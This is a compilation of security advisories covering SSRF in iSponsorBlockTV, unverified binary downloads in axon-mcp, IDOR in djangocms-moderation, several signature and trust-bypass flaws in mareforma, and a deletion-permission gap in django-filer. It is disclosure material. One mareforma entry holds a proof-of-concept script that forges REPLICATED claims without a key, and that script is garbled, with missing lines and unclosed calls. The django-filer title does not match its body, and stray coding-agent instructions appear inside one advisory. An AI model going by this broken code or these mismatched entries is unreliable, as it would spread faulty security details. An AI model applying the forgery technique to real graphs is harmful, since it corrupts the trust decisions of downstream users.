iSponsorBlockTV discovers local smart TV devices via SSDP (Simple Service Discovery Protocol). The LOCATION URL from SSDP responses is used to fetch device capabilities without URL validation. A local network attacker can craft a malicious SSDP response with a LOCATION pointing to any internal HTTP service, causing SSRF when the application fetches device information.

Details

In src/iSponsorBlockTV/dial_client.py:92-96, upon receiving an SSDP M-SEARCH response, the code extracts the LOCATION header and makes an HTTP GET request to that URL to retrieve DIAL device description XML. The URL is not validated against expected device IP ranges, expected schemes, or private/internal IP blocklists. Any device on the LAN (or a rogue WiFi access point) can respond to SSDP M-SEARCH queries with a LOCATION pointing to internal services.

Impact

Blind SSRF against internal network services; access to home router admin interfaces, smart home controllers, NAS admin pages, and other local services; potential credential disclosure from fetched responses. It'd be able to either:

  • show a debug log line - __main__ - DEBUG - Discovered device at <attacker controlled URL>, processing... (which is normally disabled and won't be shown in the actual configurator since textual doesn't show logs unless running in dev mode and launching a second terminal to inspect log output), and make a single GET request to an "attacker controlled" url which does not leak any information back to iSponsorBlockTV itself and swallows any sort of error (parsing or an invalid response from not being a real DIAL server) (dial_client.py L131-L133)
  • make single POST request to a partly "attacker controlled" url since it'll always have the suffix /YouTube appended (dial_client.py L139) , with predefined headers {"Origin": "https://www.youtube.com","Content-Type": "application/x-www-form-urlencoded",} (dial_client.py L158-L161) and a predefined payload {"pairingCode": <random 12 digit code>, "theme": "cl"} which also does not leak any information back to iSponsorBlockTV itself and swallows any sort of error (parsing or an invalid response from not being a real DIAL server with a YouTube app running on it) (dial_client.py L162)

Fix

Validate SSDP LOCATION URLs: allow only http{s}:// scheme, extract the IP address, and verify it matches the SSDP sender's IP address. Reject LOCATION values pointing to private IP ranges other than the expected device subnet. (Done on v2.11.0)

entry.title: [axon-mcp] Axon: Download of Code Without Integrity Check in axon-mcp
entry.content:
Affected versions

PackageVulnerable versionsPatched version
axon-mcp <= 0.1.0 No fix available

Summary

axon rtk-install downloads a pre-built rtkx binary from GitHub releases and executes it via subprocess.run() on every text-compression call, without verifying its integrity — no checksum, signature, or attestation check anywhere in the download/install path. If the release pipeline or a maintainer token for sammyjdev/rtkx were ever compromised, every axon user who installs or auto-bootstraps rtkx would silently download and execute an unverified binary with the same privileges as the axon process.

Details

The download path lives in src/axon/context/rtk_bootstrap.py:

  • _http_download() fetches the release archive over HTTPS via urllib.request.urlopen() and writes the raw response bytes to disk — no hash comparison against any published value.
  • _extract_binary() unpacks the archive (zip/tar.gz) and sets the executable bit (out.chmod(... S_IXUSR | S_IXGRP | S_IXOTH)), again with no verification step.
  • There is no reference to checksum, sha256, verify, signature, gpg, cosign, or sigstore anywhere in this file.

The binary is not dead code — it's on the active execution path. src/axon/context/rtk.py::rtk_binary_path() resolves to the bootstrapped binary at ~/.axon/bin/rtkx, and compress_text_with_rtk() invokes it directly:

result = subprocess.run( [path, "read", str(tmp_path)], capture_output=True, text=True, timeout=timeout_seconds, )

PoC

This is a missing-control finding rather than an active exploit, so reproduction is by code audit rather than a live payload:

Clone sammyjdev/axon and open src/axon/context/rtk_bootstrap.py. Confirm _http_download() and _extract_binary() perform no hash/signature check before chmod +x. Trace the call chain: bootstrap_rtkx() → _http_download() → _extract_binary() → rtk_binary_path() (in rtk.py) → subprocess.run() in compress_text_with_rtk(). Optionally demonstrate impact safely: point download_url() / the download callable (already injectable per the module's own docstring, "the download step is injectable so the extraction logic is testable offline") at a local HTTP server serving an attacker-controlled archive, and confirm it gets extracted, chmod +x'd, and executed with no rejection.

Impact

Type: CWE-494 (Download of Code Without Integrity Check), leading to potential arbitrary code execution. Who's affected: Any axon user who runs axon rtk-install or triggers auto-bootstrap, if sammyjdev/rtkx's release pipeline or a maintainer's release credentials are ever compromised. Not exploitable today without that precondition, but the missing control removes the last line of defense against a supply-chain compromise of the binary dependency.

entry.title: [djangocms-moderation] djangocms-moderation: Moderation comments disclosed to non-participant staff via the admin changelist
entry.content:
Affected versions

PackageVulnerable versionsPatched version
djangocms-moderation <= 2.3.0 2.4.0

Summary

The Django admin views for moderation comments (CollectionCommentAdmin and RequestCommentAdmin) render the full comment body but scope access only by an attacker-controlled id in the URL and Django's model-level view_*comment permission. They perform no per-object participant check. As a result, any authenticated staff user who holds the comment view permission can read the comments of any collection or moderation request — including ones they are not a participant of — simply by supplying the target object's id.

Comments are documented and intended to be private to the participants of a collection (its author and the moderators assigned to its workflow). This advisory concerns a read/write authorization asymmetry: the write paths already enforced request.user == obj.author, but the read paths did not enforce any participant check.

Details

ModerationRequest.user_can_view_comments() — the gate intended to protect comment reads (author or assigned moderator) — existed in the codebase but was never called by the comment admins. Neither CollectionCommentAdmin nor RequestCommentAdmin overrode get_queryset, and their changelist_view / changeform_view methods resolved the target object directly from the user-supplied id without an authorization check.

The changelists are hard-scoped to a single collection / moderation request (they raise Http404 when no id is present), so the exposure is not "all comments at once," but any specific collection's or request's comments can be retrieved by iterating ids.

  • list_display on both admins includes the comment message, so the full body is disclosed directly in the changelist HTML.
  • The individual changeform (.../<id>/change/) discloses the same content via a direct URL.

Impact

  • Type: Information disclosure / broken object-level authorization (IDOR).
  • Confidentiality: Comment contents of collections/requests the user does not participate in are exposed. This can include sensitive internal editorial discussion.
  • Integrity / Availability: No impact — comment creation, editing, and deletion already enforced author checks and are unaffected.
  • Who is affected: Deployments where more than one team/group of staff reviewers holds the view_collectioncomment / view_requestcomment permission. A reviewer of collection A can read the comments of collection B.

Workarounds

Restrict the view_collectioncomment and view_requestcomment model permissions to trusted users only, and avoid granting them across teams that must not see each other's moderation comments. This does not fully close the issue but reduces the set of users who can exploit it. Upgrading is the only complete fix.

Remediation

Upgrade to djangocms-moderation 2.4.1.

The fix adds a user_can_view_comments participant gate (author or assigned moderator) to both comment admins, enforced in changelist_view and changeform_view for both the collection and request comment models. A ModerationCollection.user_can_view_comments() method was added to mirror the existing ModerationRequest.user_can_view_comments(). Non-participants now receive an HTTP 403 (PermissionDenied).

Credit

Reported via coordinated disclosure.

entry.title: [mareforma] Mareforma: Unsigned Claims Can Be Promoted to REPLICATED via Missing Signature Enforcement in Convergence Path
entry.content:
Affected versions

PackageVulnerable versionsPatched version
mareforma >= 0.3.0, < 0.3.7 0.3.7

Summary

mareforma 0.3.3 contains a critical integrity flaw in the REPLICATED convergence logic (_maybe_update_replicated_unlocked() in mareforma/db/core.py:1300-1319). The peer-selection SQL query that determines whether two independent claims "agree" on the same anchor does not verify that either claim carries a valid cryptographic signature from an enrolled validator key. Because rekor_enabled=False is the default and automatically sets transparency_logged=1 at insert time, every claim — signed or not — immediately satisfies the convergence precondition. An attacker with no Mareforma key can write an unsigned claim to a shared graph, cause it to converge with a legitimate signed peer claim, and have it promoted to REPLICATED status. The forged REPLICATED row is then returned by the default trust query (graph.query(min_support="REPLICATED")), allowing the attacker to inject false trust signals into any downstream consumer relying on REPLICATED as a multi-party endorsement guarantee.

Details

Root cause — mareforma/db/core.py:1300-1319

The convergence function _maybe_update_replicated_unlocked() selects peer claims using a SQL query that filters on status, unresolved, transparency_logged, and artifact_hash, but contains no predicate on signature_bundle or enrolled-key identity:

# mareforma/db/core.py:1300-1319
rows = conn.execute(
    f"""
    SELECT DISTINCT c.claim_id, c.generated_by
    FROM claims c, json_each(c.supports_json) j
    WHERE j.value IN ({placeholders})
      AND c.claim_id != ?
      AND c.generated_by != ?
      AND c.support_level != 'ESTABLISHED'
      AND c.status = 'open'
      AND c.unresolved = 0
      AND c.transparency_logged = 1
      AND (
          c.artifact_hash IS NULL
          OR ? IS NULL
          OR c.artifact_hash = ?
      )
    """,

Once peer rows are collected, the sink at core.py:1324-1334 promotes all matching claim IDs — including the attacker's — to REPLICATED without any additional validation.

Why the preconditions are trivially satisfied

  1. transparency_logged = 1 is set automatically. When rekor_enabled=False (the library default), core.py:1061 sets transparency_logged = 1 immediately after insert. There is no Rekor step, so every claim becomes convergence-eligible the moment it is written.
  2. require_signed=False is the default. mareforma/__init__.py:41 defaults require_signed to False. When the attacker opens the graph with a non-existent key path, __init__.py:132-138 silently sets signer = None, enabling unsigned claim insertion.
  3. assert_claim() performs no signature gate. _graph.py:284-291 only validates DOI resolution on the supports list before forwarding attacker-controlled fields to _db.add_claim() (_graph.py:373-380).

Why the forged claim surfaces in trust queries

The default query path at core.py:3647-3650 filters out only PRELIMINARY claims whose generator is not enrolled. Claims at REPLICATED status are returned unconditionally, so the unsigned forged row is indistinguishable from a legitimately converged row in any downstream consumer.

The helper that should have been called

core.py:3661-3669 contains _extract_signature_bundle_keyid(), which can extract the key ID from a signature_bundle. This helper exists but is never invoked on the convergence path, indicating the validation was inadvertently omitted rather than a design decision.

2 __init__.py:128-138 Missing key file → signer = None (no error raised)
3 _graph.py:284-291 assert_claim() forwards user-controlled supports after DOI check only
4 _graph.py:373-380 Calls _db.add_claim() with attacker-controlled claim fields
5 db/core.py:1208-1214 Post-insert convergence triggered when unresolved == False and transparency_logged == 1
6 db/core.py:1300-1319 Peer-selection SQL — no signature_bundle or enrolled-key check (vulnerable sink)

Step-by-step attack

from tempfile import TemporaryDirectory

import mareforma
from mareforma import signing

with TemporaryDirectory() as td:
    root = Path(td)
    key_path = root / "root-key.pem"

    # Step 1: Legitimate root agent bootstraps a key and creates an ESTABLISHED anchor.
    signing.bootstrap_key(key_path)
    with mareforma.open(root, key_path=key_path) as g:
        anchor = g.assert_claim(
            "established anchor",
            classification="DERIVED",
            generated_by="seed/root",
            seed=True,

            "same result",
            supports=[anchor],
            generated_by="honest-agent",

    #         __init__.py:132-138 silently sets signer=None — unsigned mode.
    attacker_key = root / "missing-attacker-key.pem"  # does not exist
    with mareforma.open(root, key_path=attacker_key) as g:
        # Step 4: Attacker inserts an unsigned claim supporting the same anchor.
        #         Convergence fires in _maybe_update_replicated_unlocked():
        #           - Two claims share the same ESTABLISHED anchor
        #           - Different generated_by values
        #           - Both have transparency_logged=1 (Rekor disabled by default)
        #           - No signature or enrollment check performed
        attack = g.assert_claim(
            "forged convergence",
            supports=[anchor],
            generated_by="attacker-agent",
        )

        attack_info = g.get_claim(attack)
        print(attack_info["support_level"])          # → REPLICATED
        print(attack_info["signature_bundle"] is None)  # → True (unsigned)

        # Step 5: The unsigned REPLICATED claim appears in the default trust query.
        results = g.query(min_support="REPLICATED")

            print((r["text"], r["support_level"],
                   r["signature_bundle"] is None, r["generator_enrolled"]))

REPLICATED
True

('forged convergence', 'REPLICATED', True, False)   # ← unsigned, unenrolled
('same result', 'REPLICATED', False, True)

The forged claim (signature_bundle=None, generator_enrolled=False) is promoted to REPLICATED and returned alongside legitimately signed claims.

Remediation

The convergence path must require both the incoming claim and every selected peer claim to carry a valid signature_bundle signed by a distinct enrolled validator key:

--- a/mareforma/db/core.py
+++ b/mareforma/db/core.py
@@
-    new_status_row = conn.execute(
-        "SELECT status FROM claims WHERE claim_id = ?", (new_claim_id,),
+    new_status_row = conn.execute(
+        "SELECT status, signature_bundle FROM claims WHERE claim_id = ?",
+        (new_claim_id,),
     ).fetchone()

         return
+    from mareforma import validators as _validators
+    new_keyid = _extract_signature_bundle_keyid(new_status_row["signature_bundle"])
+    if new_keyid is None or not _validators.is_enrolled(conn, new_keyid):
+        return
@@
-        SELECT DISTINCT c.claim_id, c.generated_by
+        SELECT DISTINCT c.claim_id, c.generated_by, c.signature_bundle
@@
-    if not rows:
+    peer_ids = []
+    for row in rows:
+        peer_keyid = _extract_signature_bundle_keyid(row["signature_bundle"])
+        if peer_keyid is None or peer_keyid == new_keyid:
+            continue
+        if not _validators.is_enrolled(conn, peer_keyid):
+            continue
+        peer_ids.append(row["claim_id"])
+

-    peer_ids = [r["claim_id"] for r in rows] + [new_claim_id]
+    peer_ids = peer_ids + [new_claim_id]

Impact

This is an integrity bypass vulnerability (CWE-347: Improper Verification of Cryptographic Signature). REPLICATED is mareforma's primary multi-party trust signal, intended to convey that at least two independent, enrolled validators have independently observed and signed the same result. By silently bypassing the signature and enrollment checks in the convergence path, the library allows any local agent — with no cryptographic credentials — to forge this trust signal.

Who is impacted: Any user or system that queries a mareforma graph with min_support="REPLICATED" and treats the result as evidence of multi-party validation. This includes automated pipelines, audit dashboards, policy engines, or downstream consumers that rely on REPLICATED status to gate trust decisions (e.g., accepting a dataset, approving a model artifact, or publishing a result).

Because the forged claim is indistinguishable from a legitimately converged claim in query results, consumers cannot detect the attack without out-of-band inspection of signature_bundle and generator_enrolled fields — fields that the library's default query interface does not surface prominently.

The vulnerability is exploitable in the default configuration: require_signed=False, rekor_enabled=False. The attack requires only local write access to a shared graph database (e.g., a shared filesystem or writable network mount) and no Mareforma key.

  6. Both claims are promoted to REPLICATED. No signature check is performed.
  7. graph.query(min_support="REPLICATED") returns the unsigned forged claim.

  - attack claim signature_bundle is None  (unsigned)
  - attack claim generator_enrolled == False

from pathlib import Path
from tempfile import TemporaryDirectory

from mareforma import signing

    print(f"  {msg}")
    print(SEPARATOR)

    print(f"mareforma version: {mareforma.__version__}")

    with TemporaryDirectory() as td:
        root = Path(td)
        key_path = root / "root-key.pem"

        # ------------------------------------------------------------------
        # Step 1: Bootstrap a key for the legitimate root agent.
        #         On first graph open, this key auto-enrolls as the root
        #         validator, which is required for seed=True.
        # ------------------------------------------------------------------
        banner("Step 1: Bootstrap signing key for honest root agent")
        signing.bootstrap_key(key_path)
        print(f"  Key path : {key_path}")
        print(f"  Exists   : {key_path.exists()}")

        # ------------------------------------------------------------------
        # Step 2: Honest root agent creates an ESTABLISHED anchor.
        #         Uses seed=True, which requires an enrolled validator.
        #         The first open() with a fresh key auto-enrolls it.
        # ------------------------------------------------------------------
        banner("Step 2: Honest root agent — create ESTABLISHED anchor + signed peer claim")
        with mareforma.open(root, key_path=key_path) as g:
            anchor = g.assert_claim(
                "established anchor",
                classification="DERIVED",
                generated_by="seed/root",
                seed=True,
            )
            anchor_info = g.get_claim(anchor)
            print(f"  anchor claim_id     : {anchor}")
            print(f"  anchor support_level: {anchor_info['support_level']}")
            assert anchor_info["support_level"] == "ESTABLISHED", (

            )

            # Honest agent adds a signed peer claim supporting the anchor.

                supports=[anchor],
                generated_by="honest-agent",
            )

            print(f"  honest support_level: {honest_info['support_level']}")
            print(f"  honest signed       : {honest_info['signature_bundle'] is not None}")

        #         __init__.py:132-138: missing file → signer=None (unsigned mode).
        # ------------------------------------------------------------------

        attacker_key = root / "missing-attacker-key.pem"

        print(f"  Attacker key exists: {attacker_key.exists()}  (intentionally absent)")

        with mareforma.open(root, key_path=attacker_key) as g:
            # Step 4: Attacker asserts an unsigned claim with the same anchor.

            results = g.query(min_support="REPLICATED")

            forged_in_results = False
            for r in results:

        # ------------------------------------------------------------------

        conditions = {
            "attack claim support_level == REPLICATED": attack_support_level == "REPLICATED",
            "attack claim is UNSIGNED (signature_bundle is None)": attack_unsigned,
            "attack generator_enrolled == False": attack_enrolled is False,
            "forged REPLICATED claim visible in query results": forged_in_results,

        all_pass = True
        for desc, result in conditions.items():

entry.title: [mareforma] Mareforma: transparency_logged trusts the unsigned rekor block
entry.content:
Affected versions

PackageVulnerable versionsPatched version
mareforma >= 0.3.0, < 0.3.8 0.3.8

What's wrong

During restore, transparency_logged is recomputed as 1 if (toml_logged is not False and bundle_has_rekor) else 0, where bundle_has_rekor comes only from a rekor.uuid field inside signature_bundle. That derivation is wrong in both directions.

First, the rekor block is metadata attached after signing (attach_rekor_entry in mareforma/signing/rekor.py leaves the payload and signatures untouched), so it is not covered by the Ed25519 signature. A hand-edited claims.toml can add "rekor": {"uuid": "x"} to any claim's bundle and forge the "publicly witnessed by Rekor" state. The claim signature still verifies, and restore never cross-checks the block against [rekor_inclusions] or the log. Tampering with claims.toml is the exact threat model restore defends against; _verify_claim_signatures_on_restore checks only payload and signatures.

Second, a signed claim in a graph that never used Rekor is written with transparency_logged=1 (the column default when Rekor is disabled) but restores as 0 because its bundle has no rekor block. The convergence gate requires transparency_logged = 1, so post-restore peers can no longer converge to REPLICATED. With no rekor_url configured, refresh_unsigned() is a no-op and the flag stays 0 forever. Observed on the honest path: signed non-Rekor claim restores from transparency_logged=1 to 0, and a subsequent peer stays at PRELIMINARY instead of converging.

Severity and impact

High. An attacker who edits claims.toml can mark claims Rekor-witnessed and REPLICATED-eligible without them ever having been logged. Meanwhile the common honest configuration (signed, no Rekor) has its trust state silently degraded by every catastrophic-loss restore, with no recovery path.

Location

  • mareforma/db/restore.py:376 reads toml_logged from the TOML and probes the bundle for a rekor.uuid
  • mareforma/db/restore.py:385 computes resolved_transparency from the unsigned rekor block alone
  • mareforma/db/core.py:1401 the REPLICATED convergence gate requires c.transparency_logged = 1

Fix direction

Do not derive transparency_logged from an unsigned envelope field. When a rekor block is present, require a matching, cryptographically verified [rekor_inclusions] entry (via verify_rekor_inclusion against the pinned log public key) whose hashedrekord spec.data.hash equals the SHA-256 of the claim's signed payload before setting 1; otherwise set 0.

When the claim is signed and neither the bundle nor the graph carries Rekor coordinates, restore the write-time value: the TOML omits transparency_logged unless it was 0, so treat an absent flag plus no rekor bundle as 1 (the column default for non-Rekor writes).

entry.title: [mareforma] Mareforma: invalidated claims still promote to REPLICATED
entry.content:
Affected versions

PackageVulnerable versionsPatched version
mareforma >= 0.3.0, < 0.3.8 0.3.8

What's wrong

_maybe_update_replicated_unlocked never checks t_invalid, so a claim that a signed contradiction verdict has marked invalid can still climb to REPLICATED through convergence detection, and it pulls an honest peer up with it.

Three gaps line up:

  • The new-claim short-circuit reads only status and asserter_keyid (core.py:1339-1352); an invalidated but still-open new claim passes.
  • The candidate-peer SELECT filters status = 'open', unresolved = 0, and transparency_logged = 1 but has no t_invalid predicate (core.py:1390-1410), so an invalidated existing claim qualifies as a convergence partner.
  • The promotion UPDATE gates only on status = 'open' (core.py:1422-1426), leaving a TOCTOU window even after the SELECT is fixed.

A signed contradiction verdict is meant to be terminal for the trust ladder: validate_claim refuses to promote a t_invalid claim to ESTABLISHED, and record_replication_verdict already gates its promotion UPDATE on t_invalid IS NULL. Convergence promotion is the one path that ignores the verdict. Reproduced at runtime: contradict claim X (t_invalid set, still PRELIMINARY), then assert peer Y sharing X's ESTABLISHED anchor; both X and Y land at REPLICATED, with X's t_invalid still set.

Severity and impact

High. A refuted claim re-enters the trust ladder at REPLICATED after its contradiction, and it serves as the corroborating peer that promotes an honest claim. Both outcomes contradict the documented refutation model, and REPLICATED is the input to further validation.

Location

  • mareforma/db/core.py:1339 new-claim short-circuit checks status and asserter_keyid but not t_invalid
  • mareforma/db/core.py:1390 candidate-peer SELECT WHERE clause has no t_invalid IS NULL predicate
  • mareforma/db/core.py:1422 promotion UPDATE gates on status = 'open' only, reopening the window between SELECT and UPDATE

Fix direction

Treat t_invalid the way the neighboring code already does. Extend the new-claim short-circuit to also read t_invalid and return when it is set. Add AND c.t_invalid IS NULL to the candidate-peer SELECT. Add AND t_invalid IS NULL to the promotion UPDATE's WHERE clause so the row-level lock closes the TOCTOU window, matching the gate record_replication_verdict already applies at core.py:3539.

entry.title: [mareforma] Mareforma: verify_bundle never checks a per-claim signature
entry.content:
Affected versions

PackageVulnerable versionsPatched version
mareforma >= 0.3.0, < 0.3.8 0.3.8

What's wrong

verify_bundle documents that it verifies "a bundle's DSSE envelope AND each per-claim signature", lists "per-claim signature failure" among its raised errors, and promises that partial verification never surfaces "an authenticated bundle that contains some invalid claims" as success. The code does not do this. The JSON-LD predicate built by JSONLDExporter._claim_node carries no signature material (there is no signatureBundle field on the node), so the verify loop has nothing cryptographic to check per claim. It only re-derives each claim's canonical-statement digest from the node fields and compares it to the signed subject list:

chain_input = _signing.canonical_statement({...node fields...}, node.get("evidence") or {})
expected = hashlib.sha256(chain_input).hexdigest()
if subjects[subject_name] != expected:
    raise BundleVerificationError(...)

That digest check is self-referential: the exporter signs both the subject digests and the predicate nodes with the same key. It confirms the bundle is internally consistent as built, not that each claim's purported asserter ever validly signed it. The existing test test_tampered_claim_text_in_predicate_fails asserts a "digest mismatch", confirming digest-only verification is the actual contract.

Severity and impact

Medium. All trust in a bundle collapses to the single exporter key. Whoever holds it (or a malicious exporter) can emit a bundle containing claims whose asserter signatures are missing, invalid, or forged, and verify_bundle returns success. A relying party reading the docstring believes per-claim authenticity was verified when it was not. Security-sensitive because this is the trust boundary the SCITT-style export exists to provide.

Location

  • mareforma/export_bundle.py:20 module docstring claims verification checks "every per-claim signature inside predicate"
  • mareforma/export_bundle.py:183 verify_bundle docstring promises per-claim signature verification and a per-claim signature failure error
  • mareforma/export_bundle.py:254 verify loop only recomputes and compares canonical-statement digests
  • mareforma/exporters/jsonld.py:178 _claim_node emits no signature field, so the predicate carries nothing to verify per claim

Fix direction

Two honest options. Either export each claim's signature bundle in the JSON-LD predicate and have verify_bundle cryptographically verify it (including the claim_id and subject binding) against the claim's asserter or validator key, raising on the first failure as documented. Or, if per-claim verification is out of scope for the bundle format, correct the module docstring and the verify_bundle docstring to state exactly what is verified: the bundle-level DSSE signature plus internal subject-digest consistency, with per-claim asserter signatures explicitly not checked.

entry.title: [mareforma] Mareforma: search_claims skips verify-on-read, serving forged rows
entry.content:
Affected versions

PackageVulnerable versionsPatched version
mareforma = 0.3.7 0.3.8

What's wrong

search_claims never calls _row_verified_on_read. Its row loop applies only the PRELIMINARY-unenrolled filter, then appends the row. query_claims runs the same projection but additionally re-verifies REPLICATED/ESTABLISHED signatures on read (line 4023) and drops any row that fails, per the documented tamper guarantee in the comment block above it: a high-trust row whose signature does not verify is excluded from query results entirely.

So a tampered or forged high-trust row splits the two read paths. Any process with DB write access, or an attacker copying a genuine validation envelope onto a fresh row, can flip a row to ESTABLISHED. query() drops it; search() serves it at its persisted trust level. Verified in a runtime check against a forged ESTABLISHED row:

query() returns forged row: False
search() returns forged row: True   # support_level ESTABLISHED, 'verified' key absent

The docstring makes this worse: search_claims promises "the same projection as query_claims" and that the include_unverified filter "applies identically", so callers reasonably trust search results equally. The forged row also lacks the verified key entirely, so a consumer cannot tell it went unchecked.

Severity and impact

High. The verify-on-read tamper exclusion is a stated trust guarantee, and search is a primary read surface. A forged ESTABLISHED finding that query correctly rejects is served by search as genuine, with no marker that verification was skipped.

Location

  • mareforma/db/core.py:4206 search_claims row loop applies only the PRELIMINARY-unenrolled filter, then appends
  • mareforma/db/core.py:4114 search_claims signature and docstring, which claims query_claims-identical semantics
  • mareforma/db/core.py:4023 query_claims verify-on-read call that search_claims lacks

Fix direction

Mirror query_claims: add a verify_cache: dict = {} and, inside the search_claims row loop after the include_unverified check, drop rows that fail _row_verified_on_read(conn, d, verify_cache). Since the verify filter can drop rows even when include_unverified=True, remove the single-batch break on include_unverified and keep batching until limit survivors or the FTS5 match-set is exhausted, with the same scan ceiling query_claims uses. Also set single_trust_domain / trust_domain_root on surviving ESTABLISHED rows if the "same projection" promise is to hold.

Do red/green TDD: add a regression test that fails on main, then make it pass.

Quality bar

SOLID, DRY, KISS. Clean, readable, well-tested code. No new errors, warnings, or test failures; the full suite stays green on all supported Python versions.

entry.title: [django-filer] django-filer: Missing per-object authorization on `discard` and `edit_redirect` version transitions
entry.content:
Affected versions

PackageVulnerable versionsPatched version
django-filer <= 3.4.4 3.5.0

Summary

When django-filer's optional per-folder permission system is enabled (FILER_ENABLE_PERMISSIONS=True), the "Delete files and/or folders" admin action does not enforce per-folder edit permissions the way every other mutating action does. A staff user who is scoped read-only on a folder via FolderPermission (can_edit = DENY), but who holds the global Django model-level delete_* permission, can delete files and entire subfolders inside that folder — even though their move, rename, copy, and resize actions on the same folder are correctly denied.

This is an integrity / edit-control gap (unauthorized deletion). It is not a read-confidentiality issue: filer files are world-downloadable by design, so no confidentiality claim is made.

Affected versions

  • django-filer <= 3.4.4 (verified end-to-end on 3.4.4 and on master prior to the fix).

Only installations running with FILER_ENABLE_PERMISSIONS = True (the optional per-folder FolderPermission system) are affected. Deployments that leave permissions disabled (the default) rely solely on Django model-level permissions and are not impacted by this specific gap.

Patched versions

  • Fixed in PR #1605. Upgrade to the first release containing that commit (3.5.0 or later).

Details

The delete_files_or_folders admin action in filer/admin/folderadmin.py authorized deletion using only:

  1. self.has_delete_permission(request) — which returns True for obj=None, and
  2. the Django model-level delete_file / delete_folder / delete_image permission (enforced downstream by the admin delete machinery).

It never called check_folder_edit_permissions or check_files_edit_permissions. Every sibling mutating action — move, rename, copy, resize — does call these helpers, which walk the selected objects (and their descendants) and enforce the per-folder can_edit grant from FolderPermission.

Because FolderPermission has no dedicated can_delete field, deletion is treated as an edit/management operation and is gated elsewhere on can_edit. The delete action's omission therefore let a folder-scoped read-only user bypass the per-folder control that constrains all their other write operations.

Precondition

The attacker must hold the Django model-level delete_file / delete_folder / delete_image permission. A purely read-only user (no model-level delete perm) receives 403 and cannot exploit this. This precondition matches the standard folder-scoped-staff deployment model, where staff hold model-level permissions and are further constrained per-folder by FolderPermission.

Mitigation

  • Upgrade to the patched release.
  • Until upgrading, avoid granting the model-level delete_file / delete_folder / delete_image permission to staff who are meant to be read-only on specific folders via FolderPermission.

Credit

Reported through coordinated disclosure. Fixed in PR #1605.
